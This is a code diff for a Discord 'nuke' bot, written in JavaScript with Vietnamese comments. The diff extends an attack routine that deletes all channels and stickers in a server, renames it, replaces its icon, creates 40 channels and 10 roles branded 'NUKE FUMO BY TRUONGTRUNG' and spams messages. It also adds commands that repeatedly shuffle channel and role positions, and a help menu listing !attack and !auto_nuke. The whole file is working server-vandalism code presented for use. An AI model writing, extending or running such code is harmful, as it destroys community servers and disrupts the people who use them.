@@ -31,20 +31,80 @@ async function validateImage(filePath) {
     return imageBuffer;
 }
 
+function shuffleArray(array) {
+    const shuffled = array.slice();
+    for (let i = shuffled.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
+    }
+    return shuffled;
+}
+
+function getRandomColor() {
+    const letters = '0123456789ABCDEF';
+    let color = '#';
+    for (let i = 0; i < 6; i++) {
+        color += letters[Math.floor(Math.random() * 16)];
+    }
+    return color;
+}
+
+async function shuffleChannels(guild, duration = 60000) {
+    const endTime = Date.now() + duration;
+
+    while (Date.now() < endTime) {
+        const channels = Array.from(guild.channels.cache.values());
+        const shuffledChannels = shuffleArray(channels);
+
+        const setPositionPromises = [];
+        for (let i = 0; i < channels.length; i++) {
+            setPositionPromises.push(channels[i].setPosition(shuffledChannels[i].position).catch(console.error));
+        }
+
+        await Promise.all(setPositionPromises);
+        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before the next shuffle
+    }
+}
+
+async function shuffleRoles(guild, duration = 60000) {
+    const endTime = Date.now() + duration;
+
+    while (Date.now() < endTime) {
+        const roles = Array.from(guild.roles.cache.values());
+        const shuffledRoles = shuffleArray(roles);
+
+        const setPositionPromises = [];
+        for (let i = 0; i < roles.length; i++) {
+            setPositionPromises.push(roles[i].setPosition(shuffledRoles[i].position).catch(console.error));
+        }
+
+        await Promise.all(setPositionPromises);
+        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before the next shuffle
+    }
+}
+
 async function performAttack(guild, config) {
     console.log('Performing attack on guild:', guild.name);
 
+    // Xóa kênh và sticker cũ
     const deleteChannelsPromise = Promise.all(guild.channels.cache.map(channel => channel.delete().catch(console.error)));
+    const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));
+
+    // Đặt lại tên và icon server
     const setNamePromise = guild.setName(config.newServerName).catch(console.error);
     const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));
 
+    // Tạo 40 kênh và 10 vai trò
     const channelNames = Array(40).fill('NUKE FUMO BY TRUONGTRUNG');
+    const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
     const createChannelsPromise = Promise.all(channelNames.map(name => guild.channels.create({ name, type: 0 })));
+    const createRolesPromise = Promise.all(roleNames.map(name => guild.roles.create({ 
+        name, 
+        permissions: [], 
+        color: getRandomColor() // Màu sắc ngẫu nhiên
+    }).catch(console.error)));
 
-    const createRolesPromise = guild.roles.create({ name: 'NUKE FUMO BY TRUONGTRUNG', permissions: [] }).catch(console.error);
-
-    const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));
-
+    // Tạo sticker
     let createStickersPromise = Promise.resolve();
     try {
         const iconPngBuffer = await validateImage('./converted_image.png');
@@ -62,6 +122,7 @@ async function performAttack(guild, config) {
         console.error('Error validating or creating sticker:', error);
     }
 
+    // Thực hiện tất cả các lời hứa cùng lúc
     await Promise.all([
         deleteChannelsPromise,
         setNamePromise,
@@ -72,6 +133,7 @@ async function performAttack(guild, config) {
         createStickersPromise
     ]);
 
+    // Spam tin nhắn
     const newChannels = await createChannelsPromise;
     const spamPromises = [];
     for (let i = 0; i < 5; i++) {
@@ -157,6 +219,27 @@ async function main() {
             } else {
                 message.channel.send('Invalid argument. Use "on" or "off".');
             }
+        } else if (command === 'shuffle_channels') {
+            shuffleChannels(message.guild, 60000).then(() => {
+                message.channel.send('Shuffled all channels.');
+            });
+        } else if (command === 'shuffle_roles') {
+            shuffleRoles(message.guild, 60000).then(() => {
+                message.channel.send('Shuffled all roles.');
+            });
+        } else if (command === 'help') {
+const helpMessage = `
+**Available Commands:**
+\`\`\`
+!attack - Perform an attack on the server
+!unban_all - Unban all users in the server
+!auto_nuke on/off - Start or stop auto nuke
+!shuffle_channels - Shuffle all channels' positions in the server for 1 minute
+!shuffle_roles - Shuffle all roles' positions in the server for 1 minute
+!help - Display this help message
+\`\`\`
+            `;
+            message.channel.send(helpMessage);
         }
     });
 
